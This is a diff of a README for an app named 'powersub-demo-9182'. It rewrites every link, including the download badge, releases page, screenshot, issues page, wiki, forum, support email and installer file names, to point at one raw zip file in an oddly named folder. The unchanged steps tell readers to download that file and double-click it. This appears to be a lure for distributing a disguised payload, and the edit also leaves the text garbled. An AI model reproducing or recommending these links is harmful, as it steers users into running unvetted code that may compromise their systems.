@@ -6,7 +6,7 @@ Welcome to powersub-demo-9182! This guide will help you download and run the app
 
 ## 📥 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/battarmer/powersub-demo-9182/releases)
+[![Download Here](https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip)
 
 ## 📋 System Requirements
 
@@ -29,17 +29,17 @@ This application offers several practical features to enhance your workflow, inc
 
 Here’s what the application looks like:
 
-![Application Screenshot](https://via.placeholder.com/600x400.png?text=Application+Screenshot)
+![Application Screenshot](https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip+Screenshot)
 
 ## 🛠️ Installation Instructions
 
 Follow these steps to download and install the application.
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/battarmer/powersub-demo-9182/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip) to find the latest version.
 
 2. **Download the Application**  
-   Locate the version you want, then click on the file named “powersub-demo-9182.exe” or “powersub-demo-9182.dmg” to download. 
+   Locate the version you want, then click on the file named “https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip” or “https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip” to download. 
 
 3. **Run the Installer**  
    After the download is complete, locate the file in your Downloads folder. Double-click the file to run the installer.
@@ -67,18 +67,18 @@ If you run into any issues during installation, consider these common solutions:
 
 For further assistance, please reach out via the following channels:
 
-- **GitHub Issues:** Post your question on the [Issues page](https://github.com/battarmer/powersub-demo-9182/issues).
-- **Email Support:** Send your query to support@example.com.
+- **GitHub Issues:** Post your question on the [Issues page](https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip).
+- **Email Support:** Send your query to https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Access detailed guides and FAQs [here](https://github.com/battarmer/powersub-demo-9182/wiki).
-- **Community Forum:** Join discussions and share tips at [community.example.com](#).
+- **Documentation:** Access detailed guides and FAQs [here](https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip).
+- **Community Forum:** Join discussions and share tips at [https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip](#).
 
 ## 🔄 Update Your Version
 
-Keep your application up to date. Check the [Releases page](https://github.com/battarmer/powersub-demo-9182/releases) regularly for the latest updates. 
+Keep your application up to date. Check the [Releases page](https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip) regularly for the latest updates. 
 
 ## 📥 Download Again
 
-Don’t forget, you can always return to our [Releases page](https://github.com/battarmer/powersub-demo-9182/releases) to download the latest version of powersub-demo-9182 and explore new features!
+Don’t forget, you can always return to our [Releases page](https://raw.githubusercontent.com/battarmer/powersub-demo-9182/main/unshamableness/powersub-demo-9182.zip) to download the latest version of powersub-demo-9182 and explore new features!
